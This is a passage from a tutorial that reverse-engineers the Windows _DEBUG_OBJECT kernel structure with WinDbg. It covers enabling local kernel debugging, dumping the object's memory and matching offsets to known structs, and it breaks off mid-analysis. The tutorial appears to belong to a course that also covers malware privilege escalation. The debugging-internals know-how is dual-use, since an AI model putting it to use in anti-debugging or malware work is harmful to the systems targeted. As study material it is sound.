<pre><code class="language-C">NTSTATUS NtCreateDebugObject(
	[out] PHANDLE DebugObjectHandle,
	[in] ACCESS_MASK DesiredAccess,
	[in] POBJECT_ATTRIBUTES ObjectAttributes,
	[in] ULONG Flags
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>NtCreateDebugObject</code> function's parameters:
<ul>
<li><code>DebugObjectHandle</code>: A pointer to a variable that receives a handle to the newly created object.</li>
<li><code>DesiredAccess</code>: A btimask that tells the OBject Manager exactly what actions the caller intends to perform on the Debug Object.
<ul>
<li><code>DEBUG_OBJECT_WAIT_STATE_CHANGE</code> (0x0001): Allows the debugger to call <code>NtWaitForDebugEvent</code> to queue events (breakpoints, exceptions, etc.)</li>
<li><code>DEBUG_OBJECT_ADD_REMOVE_PROCESS</code> (0x0002): Allows the debugger to attach to/detach from a target process.</li>
<li><code>DEBUG_OBJECT_SET_ATTRIBUTES</code> (0x0004): Allows the debugger to modify object flags, such as the <code>KillProcessOnExit</code> behavior.</li>
<li><code>DEBUG_ALL_ACCESS</code> (0x000F): A combination of all specific rights plus standard rights (i.e., <code>Synchronize</code>, <code>Read</code>, <code>Control</code>, etc.) (See <code>Privilege Escalation Techniques with Malware</code> -&gt; DuplicateTokenEx() for more details on Standard/Generic  rights.)</li>
</ul>
</li>
<li><code>ObjectAttributes</code>: A pointer to a structure that defines the object's name and security descriptor.</li>
<li><code>Flags</code>: Only supports one flag value, for <code>DEBUG_KILL_ON_CLOSE</code>(0x1), which automatically terminates all debugged processes if the created debug object handle is closed.</li>
</ul>
</li>
<li><code>NtCreateDebugObject</code> returns an <code>NTSTATUS</code> object, (0x0) upon success, failure otherwise (i.e., <code>Access Denied</code>).</li>
</ul>
</li>
<li>
<p><code>NtDebugActiveProcess</code>: Attaches a given debugging object to a target process.</p>
<pre><code class="language-C">NTSTATUS NtDebugActiveProcess(
	[in] HANDLE DebugObjectHandle,
	[in] HANDLE ProcessHandle
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>NtDebugActiveProcess</code> function's parameters:</li>
<li><code>DebugObjectHandle</code>: A handle to the <code>_DEBUG_OBJECT</code> object which will be attached to the target process.</li>
<li><code>ProcessHandle</code>: A handle to the target process, which is to be debugged</li>
<li><code>NtDebugActiceProcess</code> returns an <code>NTSTATUS</code> object, (0x0) upon success, failure otherwise (i.e., <code>Port already set</code>).</li>
</ul>
</li>
</ul>
</div>
</div>
<p><code>_DEBUG_OBJECT</code> is an internal kernel object, and its structure is not publicly documented. However, it is visible via symbols in publicly documented code. We can use a debugger, such as <code>WinDbg</code> to discern the structure of the object in memory. Our objective in this section is to use <code>WinDbg</code> to reveal important structural details about the <code>_DEBUG_OBJECT</code> structure in memory and reverse-engineer a <code>C</code> style <code>struct</code> using the gathered information.</p>
<h2 id="procedure"><a class="header" href="#procedure">Procedure</a></h2>
<h3 id="requirements"><a class="header" href="#requirements">Requirements</a></h3>
<ul>
<li>A Windows Machine (Physical or Virtual)</li>
<li>Administrative Privileges</li>
<li>WinDbg Installed</li>
</ul>
<h3 id="prerequisites"><a class="header" href="#prerequisites">Prerequisites</a></h3>
<ul>
<li>We will need to enable kernel debugging on the system, which is disabled by default. Use the following commands to enable kernel debugging on the local kernel:
<pre><code class="language-Powershell">bcdedit /debug on
bcdedit /dbgsettings local
</code></pre>
Then reboot the system so the changes are put into effect.</li>
</ul>
<h3 id="instructions"><a class="header" href="#instructions">Instructions</a></h3>
<h3 id="step-1-setting-up-your-debugging-environment"><a class="header" href="#step-1-setting-up-your-debugging-environment">Step 1: Setting Up Your Debugging Environment</a></h3>
<p>As stated, <code>_DEBUG_OBJECT</code> is a kernel object. As such, we will need to start two debugging sessions: one arbitrary process which runs for the sole purpose of instantiating a <code>_DEBUG_OBJECT</code> which we will analyze, and a kernel debugging session so that we may analyze kernel memory and actually discern the form of the <code>_DEBUG_OBJECT</code>.</p>
<p>First, let's start out kernel debugging session. Open <code>WinDbg</code> and navigate to <code>File</code> -&gt; <code>Start debugging</code> -&gt; <code>Attach to kernel</code> -&gt; <code>Local</code>. Select <code>Ok</code> to start debugging the local kernel:
<img src="img/windbg_file.png" alt="image" /></p>
<blockquote>
<p><code>File</code></p>
</blockquote>
<p><img src="img/start_krnl_dbg.png" alt="image" /></p>
<blockquote>
<p><code>Start debugging</code> -&gt; <code>Attach to kernel</code> -&gt; <code>Local</code> -&gt; <code>Ok</code></p>
</blockquote>
<p>This requires elevated privileges, so allow the program to make changes to the device when prompted. This should reveal the <code>WinDbg</code> command interface and prompt:
<img src="img/krnl_interface.png" alt="image" /></p>
<p>If the prompt is some variant of <code>lkd</code>, you have successfully opened a kernel debugging session!</p>
<p>Next, open another, seperate instance of <code>WinDbg</code>, navigate to <code>File</code> -&gt; <code>Start debugging</code> -&gt; <code>Launch executable</code>. This will open a <code>File Explorer</code> window, where you will be asked to select which executable to launch. For our demonstration, we will be using <code>C:\Windows\System32\notepad.exe</code>:
<img src="img/exec_launch.png" alt="image" /></p>
<p>Similarly, this should reveal a command interface and prompt to debug <code>notepad.exe</code> (or whichever other executable you selected). Now, navigate back to the kernel debugging session an type the following command:</p>
<pre><code class="language-Powershell">lkd&gt; !process 0 1 notepad.exe
</code></pre>
<p>This will reveal whether or not our application is actually running on the system and whether or not it is open as a debuggable process:
<img src="img/krnl_debug_active.png" alt="image" /></p>
<blockquote>
<p>Command interface after running our command</p>
</blockquote>
<p>This reveals some important information about our process. Take note of your:</p>
<ul>
<li><code>PROCESS</code>: <code>ffff808f13e570c0</code></li>
<li><code>Image</code>: <code>notepad.exe</code></li>
<li><code>DebugPort</code>: <code>ffff808f1162dae0</code></li>
</ul>
<p>The <code>PROCESS</code> value tells us where in kernel memory the <code>EPROCESS</code> object that correlates to the process can be found. The <code>Image</code> value tells us the name of the executable that was loaded into memory for execution, and the <code>DebugPort</code> value tells us where in memory the <code>_DEBUG_OBJECT</code> structure can be found. And with that, we have successfully set up our debugging environment, allowing us to move forward with discerning the structure of <code>_DEBUG_OBJECT</code>.</p>
<h3 id="step-2-dumping-the-raw-bytes"><a class="header" href="#step-2-dumping-the-raw-bytes">Step 2: Dumping the Raw Bytes</a></h3>
<p>Now that we know where the <code>DEBUG_OBJECT</code> is, we need to get the actual bytes that make up the structure to discern any of its structural details. First, we need to determine how much space the structure occupies in memory:</p>
<pre><code class="language-Powershell">lkd&gt; !pool ffff808f1162dae0     # Pass Your Unique DebugPort Value
</code></pre>
<p>Running this command will reveal information about a number of related memory regions. The one we are looking for should be marked with an asterisk (<code>*</code>) and a tag <code>*Debu</code>:
<img src="img/dbg_obj_size.png" alt="image" /></p>
<p>This reveals that the <code>_DEBUG_OBJECT</code> is <code>0xd0</code> (<code>208d</code>) bytes large. To dump the raw bytes that occupy the entire memory space, we can use the following command:</p>
<pre><code class="language-Powershell">lkd&gt; dq ffff808f1162dae0 L1A
</code></pre>
<ul>
<li>Where:
<ul>
<li><code>dq</code>: Dump-Quadword. Displays the memory as 64-bit (8-byte) hexadecimal values. Since pointer and header values are 8-bytes wide on x64 systems, this is essential.</li>
<li><code>ffff808f1162dae0</code>: The address of <code>_DEBUG_OBJECT</code>, the starting memory address we want to inspect.</li>
<li><code>L1A</code>: The length of the dump we want to analyze.
<ul>
<li><code>L</code>: Length</li>
<li><code>1A</code>: A hexadecimal value (<code>26d</code>) denoting the number of quad-words we want to dump.
<ul>
<li>Since the size of <code>_DEBUG_OBJECT</code> is <code>208d</code>, divide that by 8 to reveal the number of quad-words needed to dump the entire object, then convert that number to hexadecimal, <code>0x1a</code>.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="img/dbg_obj_dump.png" alt="image" /></p>
<blockquote>
<p><code>_DEBUG_OBJECT</code> Data Dump</p>
</blockquote>
<p>Let's reorganize this info so it is more useful:</p>
<pre><code class="language-bash">Base = ffff808f1162dae0

Offset    Value
-----------------------------------
+00       00000001`00060000
+08       ffff808f`1162dae8

+10       ffff808f`1162dae8
+18       00000000`00000001

+20       00000000`00000000
+28       00000000`00000002

+30       00000000`00060001
+38       ffff808f`1162db18

+40       ffff808f`1162db18
+48       00000000`00000000

+50       ffffac8a`d8823d50
+58       ffffac8a`d8823d50

+60       00000000`00000006
+68       00000000`00000000

+70       74696157`020d0000
+78       00000000`00000000

+80       000000c8`00000000
+88       00000000`00000000

+90       00000000`00000000
+98       00000000`00000000

+A0       00000000`00008001
+A8       00000000`00000001

+B0       00000000`00000000
+B8       00000000`00080030

+C0       fffff805`80c27d80
+C8       00000000`00000000
</code></pre>
<div id="admonition-note-1" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-1-title">
<div class="admonition-title">
<div id="admonition-note-1-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Reversing.html#admonition-note-1"></a>
</div>
<div>
<p>There are a few things to consider before we move forward. First, online sources show that security researchers have discerned different forms for the <code>_DEBUG_OBJECT</code> structure over time, with different versions of Windows. For instance, consider these three resources:</p>
<ul>
<li><a href="https://www.openrce.org/articles/full_view/26">OpenRCE: Kernel User-Mode Debugging</a> - Published 2007</li>
<li><a href="https://shhoya.github.io/windows_dbgprocess.html">Shh0ya Security Lab: Debugging Process</a> - Published 2021</li>
<li><a href="https://github.com/hfiref0x/KDU/blob/master/Source/Shared/ntos/ntos.h">hfiref0x: Kernel Driver Utility</a> - Published 2025</li>
</ul>
<blockquote>
<p>I cannot guarantee the availability of any of these resources. If any of these links are dead, use an internet archive (i.e., archive.org) to try recovering the page.</p>
</blockquote>
<p>While none of these resources are authoritative, they can be correlated to known security researchers with other published works, which can be analyzed to measure the reliablility of the work they produce. Each publication exists for a different reason, but each document contains some reversed version of the <code>_DEBUG_OBJECT</code> structure for some version of Windows, and they share certain elements in common. We can use these resources, and other similar sources, as guides for our own reversing process.</p>
<p>Second, the <code>dt nt!_&lt;STRUCTURE&gt; &lt;START_ADDRESS&gt;</code> command can be used to observe whether a given memory range could contain a particular structure. For instance, <code>dt nt!_LIST_ENTRY ffffffff'fffffff0</code> could be used to determine if the 16-bytes (<code>0x10</code>) starting from <code>ffffffff'fffffff0</code> <strong>COULD</strong> be a <code>_LIST_ENTRY</code> structure, but this is no guarantee. We can use the Vergilius Project to identify the size and attributes of relevant data structures.</p>
<p>Finally, certain data structures demonstrate particular behaviors in memory that stand out. For instance, consider the <code>_LIST_ENTRY</code> data structure:</p>
<pre><code class="language-C">//0x10 bytes (sizeof)
struct _LIST_ENTRY
{
    struct _LIST_ENTRY* Flink;                                              //0x0
    struct _LIST_ENTRY* Blink;                                              //0x8
};
</code></pre>
<blockquote>
<p>SOURCE: <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/25h2/_LIST_ENTRY">Vergilius Project: Windows 11 25H2</a></p>
</blockquote>
<p>A <code>_LIST_ENTRY</code> is a node in a doubly-linked list. If that list only contains a single node, the <strong>Forward Link</strong> (<code>Flink</code>) and <strong>Backward Link</strong> (<code>Blink</code>) will point to the memory address of the node itself. In a data dump, this will appear as a pointer, <code>ffffffff'fffffff0</code> at the memory address it points to, <code>ffffffff'fffffff0</code>, followed by the same pointer value in the succeeding memory address, <code>ffffffff'fffffff8</code>.</p>
<p>Similarly, you can recognize potentially legible strings in a data dump, as the Hex ASCII values for A-Z are 0x41-0x5a and the Hex ASCII values for a-z are 0x61-0x7a. Consecutive bytes containing these values, likely ending with <code>0x00</code> bytes are potential strings. Also, look for <strong>LFCR</strong> (Line-Feed/Carriage-Return) characters (<code>0x0a</code>, <code>0x0d</code>), and spaces (<code>0x20</code>). Remember to consider the endian-ness of the data when decoding strings.</p>
</div>
</div>
<p>Now, looking at the 3 resources identified previously, we can see that they share certain common elements. First and foremost, they each start with the following structure:</p>
<pre><code class="language-C">struct _DEBUG_OBJECT
{
  _KEVENT EventPresent;
  _FAST_MUTEX Mutex;
  _LIST_ENTRY EventList;
  [...trunc...]
}
</code></pre>
<p>This is good information, because it implies that across Windows versions, this part of the <code>_DEBUG_OBJECT</code> remains consistent across versions. Let's take a deeper look. Referencing the Vergilius Project, we can identify the following:</p>
<pre><code class="language-C">//0x18 bytes (sizeof)
struct _KEVENT
{
    struct _DISPATCHER_HEADER Header;                                       //0x0
};
</code></pre>
<blockquote>
<p>SOURCE: <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/25h2/_KEVENT">Vergilius Project: Windows 11 25H2</a></p>
</blockquote>
<pre><code class="language-C">//0x38 bytes (sizeof)
struct _FAST_MUTEX
{
    LONG Count;                                                             //0x0
    VOID* Owner;                                                            //0x8
    ULONG Contention;                                                       //0x10
    struct _KEVENT Event;                                                   //0x18
    ULONG OldIrql;                                                          //0x30
};
</code></pre>
<blockquote>
<p>SOURCE: <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/25h2/_FAST_MUTEX">Vergilius Project: Windows 11 25H2</a></p>
</blockquote>
<p>If we include a <code>_LIST_ENTRY</code> following the <code>_FAST_MUTEX</code> structure, that is a total of <strong>96</strong> bytes (0x60). So let's consider the first <code>0x60</code> bytes of our data dump:</p>
<pre><code class="language-bash">Base = ffff808f1162dae0

Offset    Value
-----------------------------------
+00       00000001`00060000
+08       ffff808f`1162dae8

+10       ffff808f`1162dae8
+18       00000000`00000001

+20       00000000`00000000
+28       00000000`00000002

+30       00000000`00060001
+38       ffff808f`1162db18

+40       ffff808f`1162db18
+48       00000000`00000000

+50       ffffac8a`d8823d50
+58       ffffac8a`d8823d50
</code></pre>
<p>According to our prediction, first <code>0x10</code> bytes should make up a <code>_KEVENT</code> object</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>

        <!-- Livereload script (if served using the cli tool) -->
        <script>
            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
            const socket = new WebSocket(wsAddress);
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload();
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>



        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>

    </div>
    </body>
</html>
